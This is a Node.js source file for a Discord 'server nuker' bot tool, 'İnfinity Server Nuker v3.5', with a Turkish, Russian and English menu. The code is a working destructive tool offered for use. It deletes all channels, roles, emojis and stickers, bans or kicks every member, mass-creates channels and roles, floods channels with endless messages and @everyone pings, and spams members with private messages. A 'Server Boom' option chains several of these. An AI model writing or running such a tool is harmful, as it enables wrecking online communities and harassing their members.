const fs = require('fs');
const readline = require('readline');
const { Client, GatewayIntentBits } = require('discord.js');

const CONFIG_PATH = 'config.json';
const ICON_PATH = 'icon.png'; 



const askQuestion = (question) => {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout,
    });

    return new Promise((resolve) => {
        rl.question(question, (answer) => {
            rl.close();
            resolve(answer);
        });
    });
};


const chooseLanguage = async () => {
    const lang = await askQuestion('Please choose your language (tr/en/ru): ');
    if (lang.trim().toLowerCase() === 'tr') {
        return 'tr';
    } else if (lang.trim().toLowerCase() === 'ru') {
        return 'ru';
    } else {
        return 'en';
    }
};


const getToken = async () => {
    if (fs.existsSync(CONFIG_PATH)) {
        const config = JSON.parse(fs.readFileSync(CONFIG_PATH, 'utf-8'));
        return config.token;
    } else {
        const token = await askQuestion('Please enter your bot token: ');
        fs.writeFileSync(CONFIG_PATH, JSON.stringify({ token }, null, 2));
        return token;
    }
};


const getGuild = async (client, language) => {
    const guildId = await askQuestion(language === 'tr' ? 'Lütfen sunucu ID\'sini girin: ' : language === 'ru' ? 'Пожалуйста, введите ID сервера: ' : 'Please enter the server ID: ');
    const guild = client.guilds.cache.get(guildId);
    if (!guild) {
        throw new Error(language === 'tr' ? 'Geçersiz sunucu ID\'si veya bot sunucuda değil.' : language === 'ru' ? 'Неверный ID сервера или бот не в сервере.' : 'Invalid server ID or bot is not in the server.');
    }
    return guild;
};

const showCredits = () => {
    console.log(`
    \x1b[32m
    Gabimaru tarafından yapılmıştır gabimaru#0000
    \x1b[0m`); 
};



process.title = 'İnfinity Server Nuker [v3.5] By gabimaru#0000';
const showAsciiArt = () => {
    console.log(`
    \x1b[31m

        ██▓ ███▄    █   █████▒███▄    █  ██▓▄▄▄█████▓▓██   ██▓
        ▓██▒ ██ ▀█   █ ▓██   ▒ ██ ▀█   █ ▓██▒▓  ██▒ ▓▒ ▒██  ██▒
        ▒██▒▓██  ▀█ ██▒▒████ ░▓██  ▀█ ██▒▒██▒▒ ▓██░ ▒░  ▒██ ██░
        ░██░▓██▒  ▐▌██▒░▓█▒  ░▓██▒  ▐▌██▒░██░░ ▓██▓ ░   ░ ▐██▓░
        ░██░▒██░   ▓██░░▒█░   ▒██░   ▓██░░██░  ▒██▒ ░   ░ ██▒▓░
        ░▓  ░ ▒░   ▒ ▒  ▒ ░   ░ ▒░   ▒ ▒ ░▓    ▒ ░░      ██▒▒▒ 
         ▒ ░░ ░░   ░ ▒░ ░     ░ ░░   ░ ▒░ ▒ ░    ░     ▓██ ░▒░ 
         ▒ ░   ░   ░ ░  ░ ░      ░   ░ ░  ▒ ░  ░       ▒ ▒ ░░  
         ░           ░                 ░  ░            ░ ░     
                                                       ░ ░     
        
    İnfinity Server Nuker [v3.5] By gabimaru#0000                                            
    \x1b[0m`); 
};


const showMenu = async (language) => {
    console.log(language === 'tr' ? `
        1.  Kanalları Toplu Oluştur [Aktif]
        2.  Kanalları Toplu Oluştur ve Herkesi Etiketle [Aktif]
        3.  Rolleri Toplu Oluştur [Aktif]
        4.  Tüm Kanalları Sil [Aktif]
        5.  Tüm Rolleri Sil [Aktif]
        6.  Tüm Üyeleri Banla [Aktif]
        7.  Tüm Üyeleri At [Aktif]
        8. Server Patlatıcı [Aktif]
        9. Sunucu İsmini Değiştir [Aktif]
        10. Sunucu Resmini Değiştir [Aktif]
        11. Tüm Kullanıcılara Özel Mesaj Gönder [Aktif]
        12. Çıkış
        99. Kredi
    ` : language === 'ru' ? `
        1.  Массовое создание каналов [Активно]
        2.  Массовое создание каналов и упоминание всех [Активно]
        3.  Массовое создание ролей [Активно]
        4.  Удалить все каналы [Активно]
        5.  Удалить все роли [Активно]
        6.  Забанить всех участников [Активно]
        7.  Кикнуть всех участников [Активно]
        8. Взорвать сервер [Активно]
        9. Изменить имя сервера [Активно]
        10. Изменить иконку сервера [Активно]
        11. Отправить личное сообщение всем пользователям [Активно]
        12. Выход
        99. Кредиты
    ` : `
        1.  Mass Create Channels [Active]
        2.  Mass Create Channels & Ping [Active]
        3.  Mass Create Roles [Active]
        4.  Delete All Channels [Active]
        5.  Delete All Roles [Active]
        6.  Ban All Members [Active]
        7.  Kick All Members [Active]
        8. Server Boom [Active]
        9. Change Server Name [Active]
        10. Change Server Icon [Active]
        11. Send Private Message to All Users [Active]
        12. Exit
        99. Credits
    `);
    const choice = await askQuestion(language === 'tr' ? 'Lütfen bir eylem seçin (1-12, 99): ' : language === 'ru' ? 'Пожалуйста, выберите действие (1-12, 99): ' : 'Please choose an action (1-12, 99): ');
    return parseInt(choice, 10);
};




const showLoadingScreen = () => {
    console.clear();

    
    const text = "Developed by gabimaru";
    const colors = [
        "\x1b[38;2;0;123;255m",   
        "\x1b[38;2;0;255;255m",  
        "\x1b[38;2;0;255;123m",   
        "\x1b[38;2;123;0;255m"    
    ];

    const animationChars = ['-', '\\', '|', '/'];
    let animationIndex = 0;
    let progress = 0;
    const progressBarLength = 20;

    let textIndex = 0;

    return new Promise((resolve) => {
        const loadingInterval = setInterval(() => {
            
            process.stdout.write(`\r\x1b[38;2;102;51;153m[\x1b[38;2;255;0;255m${"#".repeat(progress)}${" ".repeat(progressBarLength - progress)}\x1b[38;2;102;51;153m]`);

            
            process.stdout.write(` ${colors[textIndex % colors.length]}${text.slice(0, textIndex)}\x1b[0m${text.slice(textIndex)}`);

            animationIndex %= animationChars.length;
            progress++;
            textIndex++;
            if (textIndex > text.length) textIndex = 0; 

            if (progress > progressBarLength) {
                clearInterval(loadingInterval);
                
                
                const pressEnterText = "Press Enter key to continue...";
                let pressEnterTextIndex = 0;
                const pressEnterInterval = setInterval(() => {
                    process.stdout.write(`\r\x1b[38;2;102;51;153m[\x1b[38;2;255;0;255m####################\x1b[38;2;102;51;153m] \x1b[0m${colors[pressEnterTextIndex % colors.length]}${pressEnterText.slice(0, pressEnterTextIndex)}\x1b[0m${pressEnterText.slice(pressEnterTextIndex)}   `);
                    pressEnterTextIndex++;
                    if (pressEnterTextIndex > pressEnterText.length) pressEnterTextIndex = 0;
                }, 100); 

                readline.cursorTo(process.stdout, 0);

                readline.emitKeypressEvents(process.stdin);
                process.stdin.on('keypress', (_, key) => {
                    if (key.name === 'return') {
                        clearInterval(pressEnterInterval); 
                        process.stdin.setRawMode(false);
                        process.stdin.removeAllListeners('keypress');
                        resolve();
                    }
                });
                process.stdin.setRawMode(true);
            }
        }, 100); 
    });
};


const main = async () => {
    try {
        console.clear(); 

        if (process.stdout.isTTY) { 
            try {
                process.stdout.write('\x1b[48;2;0;0;0m'); 
            } catch (error) {
                
            }
        }

        await showLoadingScreen();

        const language = await chooseLanguage();
        const TOKEN = await getToken();

        const client = new Client({
            intents: [
                GatewayIntentBits.Guilds,
                GatewayIntentBits.GuildMembers,
                GatewayIntentBits.GuildMessages,
                GatewayIntentBits.MessageContent,
            ],
        });

        client.once('ready', async () => {
            showAsciiArt();
            const guild = await getGuild(client, language);
            const icon = fs.readFileSync(ICON_PATH);

            let choice;
            while (choice !== 12) {
                choice = await showMenu(language);

                switch (choice) {
                    case 1:
                        await handleMassCreateChannels(guild, language);
                        break;
                    case 2:
                        await handleMassCreateChannelsAndPing(guild, language);
                        break;
                    case 3:
                        await handleMassCreateRoles(guild, language);
                        break;
                    case 4:
                        await handleDeleteAllChannels(guild, language);
                        break;
                    case 5:
                        await handleDeleteAllRoles(guild, language);
                        break;
                    case 6:
                        await handleBanAllMembers(guild, language);
                        break;
                    case 7:
                        await handleKickAllMembers(guild, language);
                        break;
                    case 8:
                        await handleBoomerCommand(guild, language);
                        break;
                    case 9:
                        await handleChangeServerName(guild, language);
                        break;
                    case 10:
                        await handleChangeServerIcon(guild, language);
                        break;
                    case 11:
                        await sendPrivateMessagesToAllUsers(guild, language);
                        break;
                    case 12:
                        console.log(language === 'tr' ? 'Çıkış yapılıyor...' : 'Exiting...');
                        process.exit(0);
                        break;
                    case 99:
                        showCredits();
                        break;
                    default:
                        console.log(language === 'tr' ? 'Geçersiz seçim.' : 'Invalid choice.');
                }
            }
            client.destroy();
        });

        client.login(TOKEN);
    } catch (error) {
        console.error('Error:', error);
    }
};


const sendPrivateMessagesToAllUsers = async (guild, language) => {
    const message = await askQuestion(language === 'tr' ? 'Göndermek istediğiniz mesajı girin: ' : language === 'ru' ? 'Введите сообщение, которое вы хотите отправить: ' : 'Enter the message you want to send: ');
    const numMessages = await askQuestion(language === 'tr' ? 'Kaç kullanıcıya mesaj göndermek istiyorsunuz? (max 20): ' : language === 'ru' ? 'Сколько пользователей вы хотите отправить сообщение? (макс 20): ' : 'How many users do you want to message? (max 20): ');

    const numberOfMessages = Math.min(parseInt(numMessages, 10), 20);

    const members = await guild.members.fetch();
    let count = 0;

    const sendMessageToMember = async (member) => {
        if (member.user.bot) return;
        try {
            for (let i = 0; i < numberOfMessages; i++) {
                const personalizedMessage = `<@${member.user.id}> ${message}`;
                await member.send(personalizedMessage);
                console.log(language === 'tr' ? `Mesaj gönderildi: ${member.user.tag}` : language === 'ru' ? `Сообщение отправлено: ${member.user.tag}` : `Message sent to: ${member.user.tag}`);
            }
            count++;
        } catch (error) {
            console.error(language === 'tr' ? `Mesaj gönderilemedi: ${member.user.tag}, hata: ${error.message}` : language === 'ru' ? `Не удалось отправить сообщение: ${member.user.tag}, ошибка: ${error.message}` : `Failed to send message to: ${member.user.tag}, error: ${error.message}`);
        }
    };
};



const handleChangeServerName = async (guild, language) => {
    const newName = await askQuestion(language === 'tr' ? 'Yeni sunucu adı: ' : language === 'ru' ? 'Новое имя сервера: ' : 'New server name: ');
    try {
        await guild.setName(newName);
        console.log(language === 'tr' ? 'Sunucu adı değiştirildi.' : language === 'ru' ? 'Имя сервера изменено.' : 'Server name changed.');
    } catch (error) {
        console.error(language === 'tr' ? 'Sunucu adı değiştirilemedi:' : language === 'ru' ? 'Не удалось изменить имя сервера:' : 'Failed to change server name:', error.message);
    }
};

const handleChangeServerIcon = async (guild, language) => {
    if (!fs.existsSync(ICON_PATH)) {
        console.error(language === 'tr' ? `"${ICON_PATH}" dosyası bulunamadı.` : language === 'ru' ? `"${ICON_PATH}" файл не найден.` : `"${ICON_PATH}" file not found.`);
        return;
    }

    try {
        const iconBuffer = fs.readFileSync(ICON_PATH);
        await guild.setIcon(iconBuffer);
        console.log(language === 'tr' ? 'Sunucu resmi değiştirildi.' : language === 'ru' ? 'Иконка сервера изменена.' : 'Server icon changed.');
    } catch (error) {
        console.error(language === 'tr' ? 'Sunucu resmi değiştirilemedi:' : language === 'ru' ? 'Не удалось изменить иконку сервера:' : 'Failed to change server icon:', error.message);
    }
};
const handleBoomerCommand = async (guild, language) => {
    console.log(language === 'tr' ? 'Tüm komutlar ekleniyor...' : language === 'ru' ? 'Добавление всех команд...' : 'Adding all commands...');
    
    await handleDeleteAllChannels(guild, language);
    await handleDeleteAllRoles(guild, language);
    await handleMassCreateChannels(guild, language);
    await handleMassCreateChannelsAndPing(guild, language);
    await handleMassCreateRoles(guild, language);
    await handleDeleteAllEmojis(guild, language);

    console.log(language === 'tr' ? 'Tüm komutlar eklendi.' : language === 'ru' ? 'Все команды добавлены.' : 'All commands added.');
};
const handleMassCreateChannels = async (guild, language) => {
    const numChannels = await askQuestion(language === 'tr' ? 'Kaç kanal oluşturulsun? ' : language === 'ru' ? 'Сколько каналов создать? ' : 'How many channels to create? ');
    const channelsToCreate = parseInt(numChannels, 10);
    if (isNaN(channelsToCreate) || channelsToCreate <= 0) {
        console.log(language === 'tr' ? 'Geçersiz kanal sayısı.' : language === 'ru' ? 'Недопустимое количество каналов.' : 'Invalid number of channels.');
        return;
    }
    const channelName = await askQuestion(language === 'tr' ? 'Kanalın adı ne olsun? ' : language === 'ru' ? 'Какое имя должно быть у каналов? ' : 'What should be the name of the channels? ');

    const createdChannels = await massCreateChannels(guild, channelsToCreate, channelName);
    console.log(`${channelsToCreate} ${language === 'tr' ? 'kanal oluşturuldu.' : language === 'ru' ? 'каналов создано.' : 'channels created.'}`);

    const sendMessage = await askQuestion(language === 'tr' ? 'Oluşturulan kanallara mesaj gönderilsin mi? (y/n/x): ' : language === 'ru' ? 'Отправить сообщение в созданные каналы? (y/n/x): ' : 'Send message to created channels? (y/n/x): ');
    if (sendMessage.trim().toLowerCase() === 'y') {
        const messageContent = await askQuestion(language === 'tr' ? 'Gönderilecek mesaj nedir? ' : language === 'ru' ? 'Какое сообщение отправить? ' : 'What is the message to be sent? ');
        const numMessages = await askQuestion(language === 'tr' ? 'Her kanala kaç mesaj gönderilsin? ' : language === 'ru' ? 'Сколько сообщений отправить в каждый канал? ' : 'How many messages to send to each channel? ');
        const messagesToSend = parseInt(numMessages, 10);
        if (isNaN(messagesToSend) || messagesToSend <= 0) {
            console.log(language === 'tr' ? 'Geçersiz mesaj sayısı.' : language === 'ru' ? 'Недопустимое количество сообщений.' : 'Invalid number of messages.');
            return;
        }

        await sendMessagesToChannels(createdChannels, messageContent, messagesToSend);
        console.log(`${language === 'tr' ? 'Mesajlar gönderildi.' : language === 'ru' ? 'Сообщения отправлены.' : 'Messages sent.'}`);
    } else if (sendMessage.trim().toLowerCase() === 'x') {
        const messageContent = await askQuestion(language === 'tr' ? 'Gönderilecek mesaj nedir? ' : language === 'ru' ? 'Какое сообщение отправить? ' : 'What is the message to be sent? ');
        console.log(language === 'tr' ? 'Program kapanana kadar mesaj gönderiliyor...' : language === 'ru' ? 'Отправка сообщений до закрытия программы...' : 'Sending messages until the program is closed...');
        await sendMessagesToChannels(createdChannels, messageContent);
    }
}

const sendMessagesToChannels = async (channels, messageContent) => {
    const sendMessages = async (channel) => {
        while (true) {
            await channel.send(messageContent);
        }
    };

    const promises = channels.map(channel => sendMessages(channel));
    await Promise.all(promises);
};


const handleMassCreateChannelsAndPing = async (guild, language) => {
    const numChannelsPing = await askQuestion(language === 'tr' ? 'Kaç kanal oluşturulsun ve ping atılsın? ' : language === 'ru' ? 'Сколько каналов создать и упомянуть всех? ' : 'How many channels to create and ping? ');
    const channelsToCreateAndPing = parseInt(numChannelsPing, 10);
    if (isNaN(channelsToCreateAndPing) || channelsToCreateAndPing <= 0) {
        console.log(language === 'tr' ? 'Geçersiz kanal sayısı.' : language === 'ru' ? 'Недопустимое количество каналов.' : 'Invalid number of channels.');
        return;
    }
    const channelNamePing = await askQuestion(language === 'tr' ? 'Kanalın adı ne olsun? ' : language === 'ru' ? 'Какое имя должно быть у каналов? ' : 'What should be the name of the channels? ');
    await massCreateChannelsAndPing(guild, channelsToCreateAndPing, channelNamePing);
    console.log(`${channelsToCreateAndPing} ${language === 'tr' ? 'kanal oluşturuldu ve herkes etiketlendi.' : language === 'ru' ? 'каналов создано и все упомянуты.' : 'channels created and pinged everyone.'}`);
};

const handleMassCreateRoles = async (guild, language) => {
    const numRoles = await askQuestion(language === 'tr' ? 'Kaç rol oluşturulsun? ' : language === 'ru' ? 'Сколько ролей создать? ' : 'How many roles to create? ');
    const rolesToCreate = parseInt(numRoles, 10);
    if (isNaN(rolesToCreate) || rolesToCreate <= 0) {
        console.log(language === 'tr' ? 'Geçersiz rol sayısı.' : language === 'ru' ? 'Недопустимое количество ролей.' : 'Invalid number of roles.');
        return;
    }
    await massCreateRoles(guild, rolesToCreate);
    console.log(`${rolesToCreate} ${language === 'tr' ? 'rol oluşturuldu.' : language === 'ru' ? 'ролей создано.' : 'roles created.'}`);
};


const handleDeleteAllChannels = async (guild, language) => {
    await deleteAllChannels(guild);
    console.log(language === 'tr' ? 'Tüm kanallar silindi.' : language === 'ru' ? 'Все каналы удалены.' : 'All channels deleted.');
};

const handleDeleteAllRoles = async (guild, language) => {
    await deleteAllRoles(guild, language);
    console.log(language === 'tr' ? 'Tüm roller silindi.' : language === 'ru' ? 'Все роли удалены.' : 'All roles deleted.');
};

const handleDeleteAllEmojis = async (guild, language) => {
    await deleteAllEmojis(guild);
    console.log(language === 'tr' ? 'Tüm emojiler silindi.' : language === 'ru' ? 'Все эмодзи удалены.' : 'All emojis deleted.');
};

const handleBanAllMembers = async (guild, language) => {
    await banAllMembers(guild, language);
    console.log(language === 'tr' ? 'Tüm üyeler banlandı.' : language === 'ru' ? 'Все участники забанены.' : 'All members banned.');
};

const handleKickAllMembers = async (guild, language) => {
    await kickAllMembers(guild, language);
    console.log(language === 'tr' ? 'Tüm üyeler atıldı.' : language === 'ru' ? 'Все участники кикнуты.' : 'All members kicked.');
};

const handleDeleteAllStickers = async (guild, language) => {
    await deleteAllStickers(guild);
    console.log(language === 'tr' ? 'Tüm stickerlar silindi.' : language === 'ru' ? 'Все стикеры удалены.' : 'All stickers deleted.');
};


const massCreateChannels = async (guild, numberOfChannels, channelName) => {
    let createdChannels = [];
    for (let i = 0; i < numberOfChannels; i++) {
        const channel = await guild.channels.create({
            name: `${channelName}-${i + 1}`,
            type: 0,
        });
        createdChannels.push(channel);
    }
    return createdChannels;
};

const massCreateChannelsAndPing = async (guild, numberOfChannels, channelName) => {
    for (let i = 0; i < numberOfChannels; i++) {
        const channel = await guild.channels.create({
            name: `${channelName}-${i + 1}`,
            type: 0, 
        });
        channel.send('@everyone');
    }
};

const massCreateRoles = async (guild, numberOfRoles) => {
    for (let i = 0; i < numberOfRoles; i++) {
        await guild.roles.create({
            name: `role-${i + 1}`,
        });
    }
};

const deleteAllChannels = async (guild) => {
    const channels = guild.channels.cache;
    for (const [id, channel] of channels) {
        await channel.delete();
    }
};

const deleteAllRoles = async (guild, language) => {
    const roles = guild.roles.cache.filter(role => role.editable && role.id !== guild.id);
    if (roles.size === 0) {
        console.log(language === 'tr' ? 'Silinecek rol bulunamadı.' : 'No roles found to delete.');
        return;
    }
    for (const [id, role] of roles) {
        try {
            await role.delete();
            console.log(language === 'tr' ? `${role.name} rolü silindi.` : `${role.name} role deleted.`);
        } catch (error) {
            console.error(language === 'tr' ? `${role.name} rolü silinirken hata oluştu: ${error.message}` : `Error deleting ${role.name} role: ${error.message}`);
        }
    }
};

const deleteAllEmojis = async (guild) => {
    const emojis = guild.emojis.cache;
    for (const [id, emoji] of emojis) {
        await emoji.delete();
    }
};

const banAllMembers = async (guild, language) => {
    const members = await guild.members.fetch(); 
    for (const [id, member] of members) {
        if (member.bannable) {
            try {
                await member.ban();
                console.log(language === 'tr' ? `Banlandı: ${member.user.tag}` : `Banned: ${member.user.tag}`);
            } catch (error) {
                console.error(language === 'tr' ? `Banlanamadı: ${member.user.tag}, hata: ${error.message}` : `Failed to ban ${member.user.tag}: ${error.message}`);
            }
        } else {
            console.log(language === 'tr' ? `Banlanamaz: ${member.user.tag}` : `Cannot ban: ${member.user.tag}`);
        }
    }
};


const kickAllMembers = async (guild, language) => {
    const members = await guild.members.fetch();
    for (const [id, member] of members) {
        if (member.kickable) {
            try {
                await member.kick();
                console.log(language === 'tr' ? `Atıldı: ${member.user.tag}` : `Kicked: ${member.user.tag}`);
            } catch (error) {
                console.error(language === 'tr' ? `Atılamadı: ${member.user.tag}, hata: ${error.message}` : `Failed to kick ${member.user.tag}: ${error.message}`);
            }
        } else {
            console.log(language === 'tr' ? `Atılamaz: ${member.user.tag}` : `Cannot kick: ${member.user.tag}`);
        }
    }
};

const deleteAllStickers = async (guild) => {
    const stickers = guild.stickers.cache;
    for (const [id, sticker] of stickers) {
        await sticker.delete();
    }
};

main();
